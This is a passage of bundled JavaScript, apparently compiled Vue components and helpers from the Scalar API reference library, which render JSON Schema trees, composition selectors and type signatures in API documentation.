					name: getAdditionalPropertiesName(__props.schema.additionalProperties, __props.schema.propertyNames),
					noncollapsible: "",
					options: __props.options,
					propertyNamesEnum: additionalPropertiesEnum.value,
					propertyNamesSchema: additionalPropertiesKeySchema.value,
					schema: getAdditionalPropertiesValue(__props.schema.additionalProperties),
					schemaContext: __props.schemaContext,
					variant: "additionalProperties"
				}, null, 8, [
					"breadcrumb",
					"compact",
					"compositionPath",
					"compositionPathSegment",
					"cycleKey",
					"discriminator",
					"eventBus",
					"hideHeading",
					"hideModelNames",
					"depth",
					"level",
					"name",
					"options",
					"propertyNamesEnum",
					"propertyNamesSchema",
					"schema",
					"schemaContext"
				])) : createCommentVNode("", true)
			], 64);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/Schema.vue.script.js
var _hoisted_1$68 = {
	key: 0,
	class: "schema-card-description [.schema-card--level-0:nth-of-type(1)>&]:has-[+.schema-properties]:mb-0! [.schema-card--level-0:nth-of-type(1)>&]:has-[+.schema-properties]:border-b-0! [.schema-card--level-0:nth-of-type(1)>&]:has-[+.schema-properties]:pb-0!"
};
var _hoisted_2$44 = {
	key: 1,
	class: "text-c-2 py-1.5"
};
var _hoisted_3$31 = {
	key: 0,
	class: "schema-properties w-full! rounded-none! border-0!"
};
var _hoisted_4$18 = [
	"id",
	"aria-controls",
	"aria-expanded"
];
var _hoisted_5$13 = { class: "additional-toggle-label" };
var _hoisted_6$12 = ["id"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/Schema.vue.js
var Schema_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "Schema",
	props: {
		schema: {},
		level: { default: 0 },
		depth: { default: 0 },
		name: {},
		compact: { type: Boolean },
		noncollapsible: {
			type: Boolean,
			default: false
		},
		hideHeading: { type: Boolean },
		hideDescription: {
			type: Boolean,
			default: false
		},
		additionalProperties: { type: Boolean },
		hideModelNames: {
			type: Boolean,
			default: false
		},
		discriminator: {},
		breadcrumb: {},
		eventBus: {},
		options: {},
		schemaContext: {},
		compositionPath: {},
		cycleKey: {}
	},
	setup(__props) {
		const { translate } = useLocalization();
		/**
		* The dynamic scope inherited from ancestor schema resources.
		*
		* Used to bind JSON Schema 2020-12 `$dynamicRef`s to the active `$dynamicAnchor` while walking the
		* tree. Empty at the root. See {@link useDynamicScope}.
		*/
		const dynamicScope = useDynamicScope();
		/**
		* The schema subtree, read through the magic and overrides proxies only.
		*
		* Everything below this point walks the subtree read-only, so the Vue reactive and
		* detect-changes layers are peeled off once here instead of being paid for on every nested
		* property access. See {@link unwrapForRead} for why that is safe and why the other two
		* layers stay. Reactivity on the prop itself is kept: the computed tracks the `schema` prop,
		* so replacing or switching the document still re-renders.
		*/
		const schema = computed(() => unwrapForRead(__props.schema));
		/**
		* The schema this node actually renders.
		*
		* Two normalizations happen here, both no-ops for ordinary schemas:
		* - A top-level `$dynamicRef` is bound to its concrete type via the inherited dynamic scope.
		* - A resource that extends a template through a root `$ref` (JSON Schema 2020-12 `$ref` alongside
		*   `$defs`, e.g. a `PaginatedResponse` binding) is merged so its inherited properties render.
		*/
		const resolvedSchema = computed(() => {
			const value = schema.value;
			if (!value || typeof value !== "object") return value;
			const bound = resolveDynamicSchema(value, dynamicScope);
			return "$ref" in bound ? resolve.schema(bound) : bound;
		});
		/**
		* Re-provide the dynamic scope grown with this resource so nested `$dynamicRef`s bind here.
		*
		* Built once at setup from the resource's stable identity (like the ancestor set below);
		* `pushDynamicScope` only grows the scope for schemas that can carry a `$dynamicAnchor`.
		*
		* The raw schema is pushed, not the merged {@link resolvedSchema}: merging through `resolve.schema`
		* coerces the node and drops the resolved `$ref-value` from entries inside `$defs`, which
		* `$dynamicAnchor` resolution relies on to dereference the bound type (e.g. `User`).
		*/
		const scopeSchema = schema.value ? resolveDynamicSchema(schema.value, dynamicScope) : void 0;
		provide(SCHEMA_DYNAMIC_SCOPE_SYMBOL, scopeSchema ? pushDynamicScope(dynamicScope, scopeSchema) : dynamicScope);
		/**
		* Cycle-safe `expandAllSchemaProperties`.
		*
		* We track ancestor schema keys along the current render path. A node is
		* treated as cyclic when its key is already present in the ancestor set, which
		* indicates that rendering has looped back onto a self-referential schema.
		*
		* This lets us default-expand finite branches while stopping automatic
		* expansion only at cycle boundaries, preventing infinite recursion.
		*/
		const ancestors = inject(SCHEMA_ANCESTORS_SYMBOL, void 0);
		const isCyclic = computed(() => __props.cycleKey != null && !!ancestors?.has(__props.cycleKey));
		const childAncestors = new Set(ancestors ?? []);
		if (__props.cycleKey != null) childAncestors.add(__props.cycleKey);
		provide(SCHEMA_ANCESTORS_SYMBOL, childAncestors);
		const shouldForceExpand = computed(() => !!__props.options.expandAllSchemaProperties && !isCyclic.value);
		/**
		* Whether this schema sits on the path to the current anchor/scroll target.
		*
		* Property anchors are dot-joined breadcrumbs, so every disclosure that wraps
		* the target has a breadcrumb that is a prefix of the target id. Opening those
		* disclosures is what makes deep links to collapsed (hidden) properties work
		* without forcing every schema open via `expandAllSchemaProperties`.
		*/
		const isOnTargetPath = computed(() => isOnScrollTargetPath(toNodeKey(__props.breadcrumb)));
		/**
		* Whether the disclosure starts expanded. Non-collapsible schemas are always
		* open. When `expandAllSchemaProperties` is enabled, finite branches start
		* expanded by default while cyclic branches remain collapsed to avoid recursion
		* loops. We also open any disclosure on the path to the current scroll target so
		* deep links resolve even when the property is collapsed.
		*
		* This is only the last step of the store's resolution order: it applies when
		* nobody has touched this node and no bulk action or baseline covers it.
		*/
		const defaultOpen = computed(() => __props.noncollapsible || shouldForceExpand.value || isOnTargetPath.value);
		/** Gets the description to show for the schema */
		const schemaDescription = computed(() => {
			const value = resolvedSchema.value;
			if (__props.hideDescription) return null;
			const rawSchema = schema.value;
			if (rawSchema?.allOf && rawSchema.allOf.length > 0 && __props.name === "Request Body") return mergeAllOfSchemas(rawSchema)?.description || null;
			if (!value?.description || typeof value.description !== "string") return null;
			if (value.enum) return null;
			if (!("properties" in value) && !("patternProperties" in value) && !("additionalProperties" in value) && !("allOf" in value)) return null;
			return value.description;
		});
		/**
		* Infer a selector for mapped discriminators that do not declare `oneOf`.
		* Threaded discriminators skip inference to avoid recursive allOf variants.
		*/
		const inferredDiscriminatorComposition = computed(() => schema.value && !__props.discriminator && isTypeObject(schema.value) ? inferDiscriminatorMappingComposition(schema.value, __props.options.document) : null);
		/**
		* Whether an enclosing Schema already established a tree root. `depth === 0`
		* alone is not enough: a nested Schema can mount at depth 0 (an `allOf`
		* member, or a caller that omits `depth`), and a second root would mount a
		* second sticky strip and keydown root, firing every arrow key twice.
		*/
		const hasTreeRootAbove = inject(SCHEMA_TREE_ROOT_SYMBOL, false);
		/** The root-only features (glyph tokens, keyboard navigation) live on the outermost tree root only */
		const isTreeRoot = computed(() => __props.depth === 0 && !hasTreeRootAbove);
		provide(SCHEMA_TREE_ROOT_SYMBOL, true);
		/** Delegated arrow-key navigation, active only when the flag is on */
		const onTreeKeydown = (event) => {
			if (isTreeRoot.value && __props.options.schemaKeyboardNav) handleTreeKeydown(event);
		};
		const expansion = useSchemaExpansion();
		/**
		* Fallback identity for nodes mounted without a breadcrumb (models, AsyncAPI
		* messages, the classic layouts). Until those surfaces pass real breadcrumbs,
		* this keeps them from all resolving to the empty key and toggling as one node.
		*/
		const anonymousKey = useId();
		const nodeKey = computed(() => toNodeKey(__props.breadcrumb) || `~anonymous-${anonymousKey}`);
		/**
		* Whether this disclosure is open. Resolved from the store on every read, not
		* latched at mount, so a second deep link into an already-rendered operation
		* works and expansion survives the composition variant remount.
		*/
		const open = computed(() => __props.noncollapsible || expansion.isExpanded(nodeKey.value, {
			cyclic: isCyclic.value,
			defaultOpen: defaultOpen.value
		}));
		/** Additional-property panels hide until opened; every other panel always renders */
		const panelRendered = computed(() => !__props.additionalProperties || open.value);
		const toggleId = useId();
		const panelId = useId();
		/**
		* The reveal is one-way: its button hides once the panel opens, so nothing
		* here can collapse a subtree that holds focus. The rows inside handle that
		* themselves (see `toggleTree` in SchemaProperty.vue).
		*/
		const toggle = () => {
			if (__props.noncollapsible) return;
			expansion.setExpanded(nodeKey.value, !open.value);
		};
		return (_ctx, _cache) => {
			return resolvedSchema.value && Object.keys(resolvedSchema.value).length ? (openBlock(), createElementBlock("div", {
				key: 0,
				class: normalizeClass(["schema-card", [
					`schema-card--level-${__props.level}`,
					{
						"schema-card--compact": __props.compact,
						"schema-card--open": open.value
					},
					{ "additional-card--tree": __props.additionalProperties },
					"schema-card--tree",
					{ "schema-tree [--schema-glyph-background:var(--scalar-background-1)] [--schema-glyph-color:var(--scalar-color-2)]": isTreeRoot.value }
				]]),
				onKeydown: onTreeKeydown
			}, [
				schemaDescription.value ? (openBlock(), createElementBlock("div", _hoisted_1$68, [createVNode(unref(ScalarMarkdown_default), { value: schemaDescription.value }, null, 8, ["value"])])) : createCommentVNode("", true),
				unref(isEmptySchemaObject)(resolvedSchema.value) ? (openBlock(), createElementBlock("div", _hoisted_2$44, toDisplayString(unref(translate)("schema.emptyObject")), 1)) : createCommentVNode("", true),
				createBaseVNode("div", { class: normalizeClass(["schema-properties", [{ "schema-properties-open": open.value }, "w-full! rounded-none! border-0! [.schema-card--level-0:nth-of-type(1)>.schema-card-description+&]:mt-0! [.schema-card-description+&]:mt-1.5!"]]) }, [__props.additionalProperties ? withDirectives((openBlock(), createElementBlock("div", _hoisted_3$31, [createBaseVNode("button", {
					id: unref(toggleId),
					"aria-controls": panelRendered.value ? unref(panelId) : void 0,
					"aria-expanded": open.value,
					class: "schema-card-title schema-card-title--compact group/tree-control additional-toggle--tree font-code text-c-1! relative flex h-auto min-h-8 items-center gap-0! px-0! py-[var(--schema-row-pad,6px)]! text-sm! font-bold!",
					type: "button",
					onClick: toggle
				}, [createVNode(SchemaGlyphPuck_default, { class: "additional-toggle-glyph" }), createBaseVNode("span", _hoisted_5$13, [createTextVNode(toDisplayString(unref(translate)("schema.showAdditionalProperties")) + " ", 1), __props.name ? (openBlock(), createBlock(ScreenReader_default, { key: 0 }, {
					default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("schema.forName", { name: __props.name })), 1)]),
					_: 1
				})) : createCommentVNode("", true)])], 8, _hoisted_4$18)], 512)), [[vShow, !open.value]]) : createCommentVNode("", true), panelRendered.value ? (openBlock(), createElementBlock("ul", {
					key: 1,
					id: unref(panelId),
					role: "list"
				}, [inferredDiscriminatorComposition.value ? (openBlock(), createBlock(SchemaComposition_default, {
					key: 0,
					breadcrumb: __props.breadcrumb,
					compact: __props.compact,
					composition: "oneOf",
					compositionPath: __props.compositionPath,
					discriminator: schema.value?.discriminator,
					eventBus: __props.eventBus,
					hideHeading: __props.hideHeading,
					depth: __props.depth,
					hideModelNames: __props.hideModelNames,
					level: __props.level,
					name: __props.name,
					options: __props.options,
					schema: inferredDiscriminatorComposition.value,
					schemaContext: __props.schemaContext
				}, null, 8, [
					"breadcrumb",
					"compact",
					"compositionPath",
					"discriminator",
					"eventBus",
					"hideHeading",
					"depth",
					"hideModelNames",
					"level",
					"name",
					"options",
					"schema",
					"schemaContext"
				])) : unref(isTypeObject)(resolvedSchema.value) ? (openBlock(), createBlock(SchemaObjectProperties_default, {
					key: 1,
					breadcrumb: __props.breadcrumb,
					compact: __props.compact,
					compositionPath: __props.compositionPath,
					discriminator: __props.discriminator,
					eventBus: __props.eventBus,
					hideHeading: __props.hideHeading,
					depth: __props.depth,
					hideModelNames: __props.hideModelNames,
					level: __props.level + 1,
					options: __props.options,
					schema: resolvedSchema.value,
					schemaContext: __props.schemaContext
				}, null, 8, [
					"breadcrumb",
					"compact",
					"compositionPath",
					"discriminator",
					"eventBus",
					"hideHeading",
					"depth",
					"hideModelNames",
					"level",
					"options",
					"schema",
					"schemaContext"
				])) : (openBlock(), createElementBlock(Fragment, { key: 2 }, [resolvedSchema.value ? (openBlock(), createBlock(SchemaProperty_default, {
					key: 0,
					breadcrumb: __props.breadcrumb,
					compact: __props.compact,
					compositionPath: __props.compositionPath,
					discriminator: __props.discriminator,
					eventBus: __props.eventBus,
					hideHeading: __props.hideHeading,
					depth: __props.depth,
					hideModelNames: __props.hideModelNames,
					level: __props.level,
					options: __props.options,
					schema: resolvedSchema.value,
					schemaContext: __props.schemaContext
				}, null, 8, [
					"breadcrumb",
					"compact",
					"compositionPath",
					"discriminator",
					"eventBus",
					"hideHeading",
					"depth",
					"hideModelNames",
					"level",
					"options",
					"schema",
					"schemaContext"
				])) : createCommentVNode("", true)], 64))], 8, _hoisted_6$12)) : createCommentVNode("", true)], 2)
			], 34)) : createCommentVNode("", true);
		};
	}
}), [["__scopeId", "data-v-d6bb8b3b"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaComposition.vue.script.js
var _hoisted_1$67 = { class: "property-rule [.children+&]:mt-1.5!" };
var _hoisted_2$43 = {
	class: "composition-selector composition-selector--tree group/tree-control font-code relative flex w-fit cursor-pointer items-center gap-1.5 py-1 text-sm",
	type: "button"
};
var _hoisted_3$30 = { class: "text-c-1 [font-weight:var(--scalar-bold)]" };
var _hoisted_4$17 = {
	key: 0,
	class: "text-red"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaComposition.vue.js
var SchemaComposition_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "SchemaComposition",
	props: {
		composition: {},
		discriminator: {},
		name: {},
		schema: {},
		level: {},
		depth: { default: 0 },
		compact: {
			type: Boolean,
			default: false
		},
		hideHeading: {
			type: Boolean,
			default: false
		},
		hideModelNames: { type: Boolean },
		breadcrumb: {},
		eventBus: {},
		options: {},
		schemaContext: {},
		compositionPath: {}
	},
	setup(__props) {
		const props = __props;
		const { translate } = useLocalization();
		/**
		* Split an `allOf` into an ordered list of segments (object chunks + choice
		* pickers) so multiple mutually-exclusive selections each render their own
		* picker, in the position they were declared, instead of all but the first
		* being dropped and the rest bubbling to the end.
		*/
		const allOfSegments = computed(() => props.composition === "allOf" ? partitionAllOfCompositions(props.schema).segments : []);
		/** The current composition */
		const composition = computed(() => [props.schema[props.composition]].flat().map((schema) => ({
			value: resolve.schema(schema),
			original: schema
		})).filter((it) => isDefined(it.value)));
		/**
		* Generate listbox options for the composition selector.
		* Each option represents a schema in the composition with a human-readable label.
		* Prefers schema title/name (including array item models, e.g. `Model[]`) over
		* structural type when present.
		*/
		const listboxOptions = computed(() => composition.value.map((schema, index) => {
			const resolved = resolve.schema(schema.original);
			const label = (getModelNameWithArray(resolved)?.label ?? getSchemaType(resolved)) || translate("schema.schema");
			const mapping = (props.schema.discriminator ?? props.discriminator)?.mapping;
			const values = getDiscriminatorValues(resolved.$ref, mapping);
			return {
				id: String(index),
				label: values.length ? `${values.join(", ")} · ${label}` : label
			};
		}));
		const compositionSelectionKey = computed(() => props.compositionPath?.length ? [...props.compositionPath, props.composition].join(".") : "");
		/** When this composition is in the request body, sync selection with the example snippet */
		const requestBodyCompositionSelectionRef = inject(REQUEST_BODY_COMPOSITION_INDEX_SYMBOL, void 0);
		const initialSelectedIndex = computed(() => {
			if (props.schemaContext !== "requestBody" || !requestBodyCompositionSelectionRef?.value || !compositionSelectionKey.value) return 0;
			const selectedIndex = requestBodyCompositionSelectionRef.value[compositionSelectionKey.value];
			if (typeof selectedIndex !== "number" || Number.isNaN(selectedIndex)) return 0;
			return Math.max(0, Math.min(selectedIndex, listboxOptions.value.length - 1));
		});
		/**
		* Two-way computed property for the selected option.
		* Handles conversion between the selected index and the listbox option format.
		*/
		const selectedOption = ref();
		watch([listboxOptions, initialSelectedIndex], ([options, selectedIndex]) => {
			if (!selectedOption.value || !options.some((option) => option.id === selectedOption.value?.id)) selectedOption.value = options[selectedIndex] ?? options[0];
		}, { immediate: true });
		const compositionLabel = (type) => translate(`schema.${type}`);
		/** Inside the currently selected composition */
		const selectedComposition = computed(() => composition.value[Number(selectedOption.value?.id ?? "0")]?.value);
		/**
		* The request body card renders the merged `allOf` description on its outer card
		* (see `Schema.vue`), but only for the top-level request body schema. For that
		* single composition we hide the nested merged `Schema`'s description so the text
		* is not shown twice. Nested request-body compositions (deeper properties) are
		* not shown on the outer card and would otherwise lose their description
		* entirely, because the property row already skips it when `allOf` is present.
		*
		* The top-level request body composition is the one whose `compositionPath` is
		* still the request body root (`['requestBody']`); nested compositions append
		* property segments and therefore have a longer path.
		*/
		const isRequestBodyRootComposition = computed(() => props.schemaContext === "requestBody" && props.compositionPath?.length === 1);
		/**
		* Cycle key for the selected composition member, derived from its raw
		* (unresolved) value so a member that references an ancestor is detected as a
		* cycle.
		*/
		const selectedCompositionCycleKey = computed(() => getCycleKey(composition.value[Number(selectedOption.value?.id ?? "0")]?.original));
		/**
		* Controls whether the nested schema is displayed. When expanding all schema
		* properties we open it by default; the nested Schema handles cycle detection,
		* so finite compositions render fully while recursive ones still stop.
		*/
		const showNestedSchema = ref(!!props.options.expandAllSchemaProperties);
		if (requestBodyCompositionSelectionRef && props.schemaContext === "requestBody" && compositionSelectionKey.value) watch(selectedOption, (option) => {
			const index = option ? Number(option.id) : 0;
			if (!Number.isNaN(index)) requestBodyCompositionSelectionRef.value = {
				...requestBodyCompositionSelectionRef.value,
				[compositionSelectionKey.value]: index
			};
		}, { immediate: true });
		return (_ctx, _cache) => {
			const _component_SchemaComposition = resolveComponent("SchemaComposition", true);
			return openBlock(), createElementBlock("div", _hoisted_1$67, [props.composition === "allOf" ? (openBlock(true), createElementBlock(Fragment, { key: 0 }, renderList(allOfSegments.value, (segment, segmentIndex) => {
				return openBlock(), createElementBlock(Fragment, { key: segmentIndex }, [segment.kind === "object" ? (openBlock(), createBlock(Schema_default, {
					key: 0,
					breadcrumb: __props.breadcrumb,
					compact: __props.compact,
					compositionPath: __props.compositionPath,
					discriminator: __props.discriminator,
					eventBus: __props.eventBus,
					hideDescription: isRequestBodyRootComposition.value,
					hideHeading: __props.hideHeading,
					hideModelNames: __props.hideModelNames,
					depth: __props.depth,
					level: __props.level + 1,
					name: __props.name,
					noncollapsible: true,
					options: __props.options,
					schema: segment.schema,
					schemaContext: __props.schemaContext
				}, null, 8, [
					"breadcrumb",
					"compact",
					"compositionPath",
					"discriminator",
					"eventBus",
					"hideDescription",
					"hideHeading",
					"hideModelNames",
					"depth",
					"level",
					"name",
					"options",
					"schema",
					"schemaContext"
				])) : (openBlock(), createBlock(_component_SchemaComposition, {
					key: 1,
					breadcrumb: __props.breadcrumb,
					compact: __props.compact,
					composition: segment.composition,
					compositionPath: [...__props.compositionPath ?? [], String(segment.choiceIndex)],
					eventBus: __props.eventBus,
					hideHeading: __props.hideHeading,
					hideModelNames: __props.hideModelNames,
					depth: __props.depth,
					level: __props.level,
					options: __props.options,
					schema: segment.value,
					schemaContext: __props.schemaContext
				}, null, 8, [
					"breadcrumb",
					"compact",
					"composition",
					"compositionPath",
					"eventBus",
					"hideHeading",
					"hideModelNames",
					"depth",
					"level",
					"options",
					"schema",
					"schemaContext"
				]))], 64);
			}), 128)) : (openBlock(), createBlock(SchemaRailPanel_default, {
				key: 1,
				class: "composition-panel composition-panel--tree mt-1 mb-0.5",
				depth: __props.depth + 1
			}, {
				default: withCtx(() => [createVNode(unref(ScalarListbox_default), {
					modelValue: selectedOption.value,
					"onUpdate:modelValue": _cache[0] || (_cache[0] = ($event) => selectedOption.value = $event),
					class: "w-fit min-w-40",
					options: listboxOptions.value
				}, {
					default: withCtx(() => [createBaseVNode("button", _hoisted_2$43, [
						createVNode(SchemaGlyphPuck_default, { class: "composition-selector-icon" }, {
							default: withCtx(() => [createVNode(unref(ScalarIconCaretUpDown_default))]),
							_: 1
						}),
						createBaseVNode("span", _hoisted_3$30, toDisplayString(compositionLabel(props.composition)), 1),
						_cache[2] || (_cache[2] = createBaseVNode("span", {
							"aria-hidden": "true",
							class: "text-c-3"
						}, "·", -1)),
						createBaseVNode("span", { class: normalizeClass(["composition-selector-label text-c-1 [font-weight:var(--scalar-bold)]", { "line-through": selectedComposition.value?.deprecated }]) }, toDisplayString(selectedOption.value?.label || unref(translate)("schema.schema")), 3),
						selectedComposition.value?.deprecated ? (openBlock(), createElementBlock("div", _hoisted_4$17, toDisplayString(unref(translate)("schema.deprecated")), 1)) : createCommentVNode("", true)
					])]),
					_: 1
				}, 8, ["modelValue", "options"]), !showNestedSchema.value && __props.level > 2 ? (openBlock(), createElementBlock("button", {
					key: 0,
					class: "composition-details-toggle group/tree-control font-code text-c-1 relative flex w-fit cursor-pointer items-center py-1.5 text-sm font-normal",
					type: "button",
					onClick: _cache[1] || (_cache[1] = ($event) => showNestedSchema.value = true)
				}, [createVNode(SchemaGlyphPuck_default), createTextVNode(" " + toDisplayString(unref(translate)("schema.showSchemaDetails")), 1)])) : (openBlock(), createBlock(Schema_default, {
					key: selectedOption.value?.id ?? "0",
					breadcrumb: __props.breadcrumb,
					compact: __props.compact,
					compositionPath: __props.compositionPath,
					cycleKey: selectedCompositionCycleKey.value,
					discriminator: __props.discriminator,
					eventBus: __props.eventBus,
					hideHeading: __props.hideHeading,
					hideModelNames: __props.hideModelNames,
					depth: __props.depth + 1,
					level: __props.level + 1,
					name: __props.name,
					noncollapsible: true,
					options: __props.options,
					schema: selectedComposition.value,
					schemaContext: __props.schemaContext
				}, null, 8, [
					"breadcrumb",
					"compact",
					"compositionPath",
					"cycleKey",
					"discriminator",
					"eventBus",
					"hideHeading",
					"hideModelNames",
					"depth",
					"level",
					"name",
					"options",
					"schema",
					"schemaContext"
				]))]),
				_: 1
			}, 8, ["depth"]))]);
		};
	}
}), [["__scopeId", "data-v-53fb0f87"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/get-enum-values.js
/**
* Extract enum values from schema or array items
*
* @param value - The schema object to extract enum values from
* @returns Array of enum values, or empty array if no enum found
*/
var getEnumValues = (value) => {
	if (!value) return [];
	if (value.enum) return value.enum;
	if (isArraySchema(value) && typeof value.items === "object") {
		const resolvedItems = resolve.schema(value.items);
		if (resolvedItems && "enum" in resolvedItems && resolvedItems.enum) return resolvedItems.enum;
	}
	return [];
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/get-property-description.js
var TYPE_DESCRIPTIONS = {
	integer: {
		_default: "Integer numbers.",
		int32: "Signed 32-bit integers (commonly used integer type).",
		int64: "Signed 64-bit integers (long type)."
	},
	string: {
		"date": "full-date notation as defined by RFC 3339, section 5.6, for example, 2017-07-21",
		"date-time": "the date-time notation as defined by RFC 3339, section 5.6, for example, 2017-07-21T17:32:28Z",
		"password": "a hint to UIs to mask the input",
		"base64": "base64-encoded characters, for example, U3dhZ2dlciByb2Nrcw==",
		"byte": "base64-encoded characters, for example, U3dhZ2dlciByb2Nrcw==",
		"binary": "binary data, used to describe files"
	}
};
/**
* Generate property description from type/format
*
* @param value - The schema object to generate description from
* @returns Description string or null if no description available
*/
var getPropertyDescription = (value) => {
	if (!isSchema(value)) return null;
	/** Just grab the first type from the array if it's an array */
	const type = Array.isArray(value.type) ? value.type[0] : value.type;
	if (!type) return null;
	const typeDescriptions = TYPE_DESCRIPTIONS[type];
	if (!typeDescriptions) return null;
	return typeDescriptions["format" in value && value.format || "contentEncoding" in value && value.contentEncoding || "_default"] ?? null;
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/get-type-signature-tokens.js
/** Enums up to this many values render inline in the type position. */
var INLINE_ENUM_LIMIT = 3;
/** Extensions that attach meaning to individual enum values. */
var ENUM_ANNOTATION_KEYS = [
	"x-enumDescriptions",
	"x-enum-descriptions",
	"x-enum-varnames",
	"x-enumNames"
];
/** Quote an enum or const value the way JSON would. */
var formatLiteral = (value) => {
	if (value !== null && typeof value === "object") return JSON.stringify(value);
	return typeof value === "string" ? `"${value}"` : String(value);
};
var word = (text) => ({
	kind: "word",
	text
});
var ident = (text) => ({
	kind: "ident",
	text
});
var literal = (text) => ({
	kind: "literal",
	text
});
var pipe = () => ({
	kind: "punctuation",
	text: "|"
});
/** Join token lists with a separator token, like Array.prototype.join. */
var joinTokens = (lists, separator) => lists.flatMap((tokens, index) => index === 0 ? tokens : [...separator(), ...tokens]);
/**
* Whether the signature will actually render this schema's enum values inline.
* SchemaProperty drops the separate value list for short enums on that
* assumption, so it must be checked: a `$ref` renders as the model name before
* reaching the enum branch, and a schema with no `type` renders no type detail,
* so in both cases the values would otherwise be shown nowhere.
*/
var typeSignatureInlinesEnum = (valueOrRef, options = {}, isItems = false) => {
	if (!valueOrRef || typeof valueOrRef !== "object") return false;
	if ("$ref" in valueOrRef && typeof valueOrRef.$ref === "string" && !options.hideModelNames && getRefName(valueOrRef.$ref)) return false;
	const value = getResolvedRef(valueOrRef);
	if (!value || typeof value !== "object" || value.const !== void 0) return false;
	if (!ENUM_ANNOTATION_KEYS.some((key) => value[key]) && Array.isArray(value.enum) && value.enum.length > 0 && value.enum.length <= INLINE_ENUM_LIMIT) return true;
	if (!isItems && !("type" in value)) return false;
	const type = "type" in value ? value.type : void 0;
	const isArrayType = type === "array" || Array.isArray(type) && type.includes("array");
	const items = "items" in value ? value.items : void 0;
	if (isArrayType && items && typeof items === "object") return typeSignatureInlinesEnum(items, options, true);
	return false;
};
/**
* Compute the type signature of a schema as token runs: `array Planet[]` becomes
* `array of Planet`, where "array of" is English and `Planet` stays an
* identifier. Short enums render inline (`"standard" or "enterprise"`) because
* two values are a type, not a list worth its own rows. A `$ref` to a named
* model renders as the model name itself.
*/
var getTypeSignatureTokens = (valueOrRef, options = {}, depth = 0) => {
	if (!valueOrRef || typeof valueOrRef !== "object") return [];
	if ("$ref" in valueOrRef && typeof valueOrRef.$ref === "string") {
		const refName = options.hideModelNames ? null : getRefName(valueOrRef.$ref);
		if (refName) return [ident(refName)];
	}
	const value = getResolvedRef(valueOrRef);
	if (!value || typeof value !== "object") return [];
	if (value.const !== void 0) return [literal(formatLiteral(value.const))];
	if (Array.isArray(value.enum) && value.enum.length > 0 && value.enum.length <= INLINE_ENUM_LIMIT && !ENUM_ANNOTATION_KEYS.some((key) => value[key])) return joinTokens(value.enum.map((entry) => [literal(formatLiteral(entry))]), () => [word("or")]);
	if ("type" in value && Array.isArray(value.type)) return joinTokens(value.type.map((entry) => entry === "array" ? arrayTokens(value, options, depth) : [ident(String(entry))]), () => [pipe()]);
	if ("type" in value && value.type === "array") return arrayTokens(value, options, depth);
	if ("type" in value && value.type && value.contentEncoding) return [
		ident(String(value.type)),
		word("•"),
		ident(value.contentEncoding)
	];
	if ("type" in value && value.type) return [ident(String(value.type))];
	return [];
};
/**
* The tokens a row shows: the raw signature, renamed to the caller's resolved
* model name where the two would disagree.
*
* A `$ref` renders as the raw component key while the heading link and the
* models section show the target's `title`; the caller's name keeps them in
* agreement. Only a `$ref` may be renamed: an inline schema's
* single token is its real type (`integer`), not its `title`.
*/
var getDisplayTypeSignatureTokens = (valueOrRef, options = {}) => {
	const computedTokens = getTypeSignatureTokens(valueOrRef, { hideModelNames: options.hideModelNames });
	const modelName = options.modelName;
	if (!modelName) return computedTokens;
	const isRef = (value) => !!value && typeof value === "object" && "$ref" in value;
	if (computedTokens.length === 0 || computedTokens.length === 1 && computedTokens[0]?.text === "object") return [ident(modelName)];
	if (isRef(valueOrRef) && computedTokens.length === 1 && computedTokens[0]?.kind === "ident" && computedTokens[0]?.text !== modelName) return [ident(modelName)];
	const items = valueOrRef && typeof valueOrRef === "object" && "items" in valueOrRef ? valueOrRef.items : void 0;
	const arrayWord = computedTokens[0];
	const itemToken = computedTokens[1];
	if (isRef(items) && computedTokens.length === 2 && arrayWord?.kind === "word" && itemToken?.kind === "ident") {
		if (modelName.endsWith("[]")) {
			const itemName = modelName.slice(0, -2);
			if (itemName && itemName !== itemToken.text) return [arrayWord, ident(itemName)];
		}
	}
	return computedTokens;
};
/** Guard against a pathological items chain; deeper than this reads as noise anyway. */
var MAX_ARRAY_DEPTH = 8;
var arrayTokens = (value, options, depth) => {
	const items = "items" in value ? value.items : void 0;
	if (!items || depth >= MAX_ARRAY_DEPTH) return [ident("array")];
	const itemTokens = getTypeSignatureTokens(items, options, depth + 1);
	if (itemTokens.length === 0) return [ident("array")];
	return [word("array of"), ...itemTokens];
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/normalize-object-composition.js
/** Preserve a named property's object boundary when all of its composition members form one object. */
var normalizeObjectComposition = (value, name) => {
	if (!name || !value?.allOf || value.oneOf || value.anyOf || value.not) return value;
	const { segments } = partitionAllOfCompositions(value);
	const segment = segments[0];
	if (segments.length !== 1 || segment?.kind !== "object" || !isTypeObject(segment.schema)) return value;
	const objectSchema = { ...segment.schema };
	if ("$ref" in objectSchema) delete objectSchema.$ref;
	const annotations = {
		title: value.title,
		description: value.description,
		deprecated: value.deprecated,
		readOnly: value.readOnly,
		writeOnly: value.writeOnly,
		example: value.example,
		examples: value.examples,
		nullable: value.nullable
	};
	return {
		...objectSchema,
		...annotations,
		..."$ref" in value && typeof value.$ref === "string" ? { $ref: value.$ref } : {}
	};
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/optimize-value-for-display.js
/**
* Shallow-merges schema-like objects, but unions `properties` and `required`
* instead of letting a later object's `properties`/`required` completely
* overwrite an earlier one's. Without this, a variant schema (e.g. a `oneOf`
* branch) that declares its own `properties`/`required` would wipe out the
* shared base fields factored out at the root (or via a sibling `allOf`)
* instead of being combined with them (#9657).
*/
function mergeSchemaProperties(...objects) {
	const merged = {};
	const properties = {};
	const required = /* @__PURE__ */ new Set();
	let hasProperties = false;
	let hasRequired = false;
	for (const object of objects) {
		if (!object) continue;
